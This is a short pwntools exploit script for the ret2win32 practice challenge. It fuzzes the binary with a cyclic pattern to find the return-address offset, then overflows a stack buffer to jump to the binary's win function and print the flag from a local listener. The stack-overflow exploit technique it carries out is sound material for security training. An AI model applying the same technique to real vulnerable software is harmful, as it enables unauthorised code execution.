from pwn import *

#use the following command to have the binary listening on localhost:1234
#socat TCP4-LISTEN:1234,reuseaddr,fork EXEC:./ret2win32

LOCATION = "./ret2win32"
REMOTE   = remote("localhost", 1234) #binary listening on the machine

binary = ELF(LOCATION)

def pcOffset(): 
    proc = process(LOCATION, timeout=2) #start process to fuzz
    proc.sendline(cyclic(1024))         #crash process with cyclic pattern
    proc.recvall()                      
    core = Core("core")                 #open core file
    pcOff = cyclic_find(core.pc)        #find EIP offset using cyclic finder
    return pcOff

def exploit():
    exp  = 'A' * offset                   #overflow buffer
    exp += p32(binary.symbols["ret2win"]) #overwrite EIP with ret2win() address taken from binary 
    REMOTE.recvuntil('>')
    REMOTE.sendline(exp)                  #send exploit
    REMOTE.recvuntil(":")
    log.success("Flag: {0}".format(REMOTE.recv()))

offset = pcOffset()
exploit()

